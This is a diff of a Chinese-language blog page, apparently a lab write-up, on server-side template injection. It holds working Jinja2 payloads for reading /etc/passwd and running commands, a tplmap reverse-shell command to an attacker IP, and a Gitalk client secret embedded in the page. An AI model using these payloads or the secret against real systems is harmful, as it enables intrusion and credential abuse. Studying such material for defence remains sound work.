@@ -3,16 +3,26 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Archives: 2020/4 | Twe1ve&#39;s Blog</title>
+  <title>SSTI[服务器模板注入] | Twe1ve&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Twe1ve&#39;s Blog">
-<meta property="og:url" content="https://github.com/archives/2020/04/page/2/index.html">
+  <meta name="description" content="漏洞成因： 用户输入未经过滤就交给引擎处理 将python语句编译成一句话：  不同类型SSTI paylaod:  SSTI模板注入常见引擎：  判断是哪种类型SSTI  一个实例： nikto结果：+ Server: Werkzeug&#x2F;0.14.1 Python&#x2F;2.7.14 —&gt;有可能存在SSTI返回输入内容，已知  检测SSTI  name&#x3D;49&amp;desc&#x3D;yyyy   —&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI[服务器模板注入]">
+<meta property="og:url" content="https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Twe1ve&#39;s Blog">
+<meta property="og:description" content="漏洞成因： 用户输入未经过滤就交给引擎处理 将python语句编译成一句话：  不同类型SSTI paylaod:  SSTI模板注入常见引擎：  判断是哪种类型SSTI  一个实例： nikto结果：+ Server: Werkzeug&#x2F;0.14.1 Python&#x2F;2.7.14 —&gt;有可能存在SSTI返回输入内容，已知  检测SSTI  name&#x3D;49&amp;desc&#x3D;yyyy   —&amp;">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.png">
+<meta property="og:image" content="https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/2.png">
+<meta property="og:image" content="https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/3.png">
+<meta property="og:image" content="https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/4.png">
+<meta property="og:image" content="https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/5.png">
+<meta property="article:published_time" content="2020-04-26T05:32:06.000Z">
+<meta property="article:modified_time" content="2020-04-26T05:40:46.401Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.png">
   
     <link rel="icon" href="/images/icon.png">
   
@@ -113,39 +123,78 @@
       </div>
     </div>
     <!--主页上右部分-->
-    <section class="archive main-right flex1">
-  
-  
-    <section class="archive-category">
-      <h1 class="title">2020</h1>
-      <ul class="menu">
-        
-          <li>
-            <a href="/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/">从两道靶场题目看XHR</a>
-            <span class="date">Apr 19, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/19/multi-ways-file-download/">multi-ways-file-download</a>
-            <span class="date">Apr 19, 2020</span>
-          </li>
-        
-          <li>
-            <a href="/2020/04/19/Rerverse-shell-Interactive-shell/">Rerverse_shell&amp;Interactive_shell</a>
-            <span class="date">Apr 19, 2020</span>
-          </li>
-        
-      </ul>
-    </section>
-  
-</section>
+    <div class="main-right flex1 flex flex-v">
+    <div class="article-content flex1">
+        <div class="article-content-container">
+            <div class="article-title row">
+                <div class="title">SSTI[服务器模板注入]</div>
+                <div class=" other">
+                    <!--<i class="iconfont icon-iconfontordinaryliulan"></i> 56--> <i
+                        class="iconfont icon-shijian"></i>· Apr 26, 2020 ·</div>
+            </div>
+            <div class="article-message markdown-body">
+                <article class="text" v-highlight>
+                    <p><strong>漏洞成因：</strong></p>
+<p>用户输入未经过滤就交给引擎处理</p>
+<p><a href="http://www.onelinerizer.com/" target="_blank" rel="noopener">将python语句编译成一句话： </a></p>
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">不同类型SSTI paylaod: </a></p>
+<p>SSTI模板注入常见引擎：</p>
+<p><img src="1.png" alt=""></p>
+<p>判断是哪种类型SSTI</p>
+<p><img src="2.png" alt=""></p>
+<p><strong>一个实例：</strong></p>
+<p>nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI<br>返回输入内容，已知</p>
+<p><img src="3.png" alt=""></p>
+<p><strong>检测SSTI</strong></p>
+<p><img src="4.png" alt=""></p>
+<p>name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）</p>
+<p>确定是jinja之后，尝试文件读取和命令执行</p>
+<p><strong>读取文件</strong></p>
+<pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</code></pre><p><img src="5.png" alt=""></p>
+<p><strong>命令执行：</strong></p>
+<pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
+{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}</code></pre><p><a href="https://github.com/epinna/tplmap">SSTI注入工具tplmap</a>： </p>
+<pre><code>python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999</code></pre>
+                </article>
+            </div>
+            <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<style>
+    .hljs {
+        display: block !important;
+        overflow-x: auto !important;
+        background: #2b2b2b !important;
+        color: #f8f8f2 !important;
+        padding: .5em !important;
+    }
+</style>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '85810192d72d7f763a9a',
+        clientSecret: 'e9867192041e53ad9f4581db6e50bbe7373a090d',
+        repo: 'myblog',
+        owner: 'callmesoul',
+        admin: ['callmesoul'],
+        id: '', // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+        </div>
+    </div>
+</div>
 
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/archives/2020/04/">&lt;span class&#x3D;&quot;iconfont icon-arrow-left&quot;&gt;&lt;&#x2F;span&gt;</a><a class="page-number" href="/archives/2020/04/">1</a><span class="page-number current">2</span>
-  </nav>
-
-
-
+<link href="https://cdn.bootcss.com/highlight.js/9.15.7/styles/a11y-dark.min.css" rel="stylesheet">
+<script src="https://cdn.bootcss.com/highlight.js/9.15.9/highlight.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+        document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+        });
+    });
+</script>
   </div>
   <!--
   <div class="main-bottom">
